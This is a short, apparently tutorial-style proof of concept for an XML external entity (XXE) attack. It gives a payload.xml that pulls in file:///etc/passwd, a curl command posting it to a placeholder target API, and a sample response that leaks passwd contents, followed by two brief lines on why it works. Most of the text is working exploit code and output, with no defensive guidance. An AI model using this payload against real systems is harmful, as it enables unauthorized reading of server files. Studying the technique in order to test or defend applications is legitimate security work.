Classic PoC — arbitrary file read

payload.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
$ curl — send the payload
curl -X POST https://target/api/users \
  -H 'Content-Type: application/xml' \
  --data-binary @payload.xml
server response
{
  "error": "User not found: ",
  "name": "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
..."
}

Why it works The parser resolves &xxe; before the app ever sees the data. The app just reads name from the parsed tree — and dutifully echoes /etc/passwd.

In-band Works whenever any field of your XML is reflected back — in JSON, HTML, an error message, anywhere.
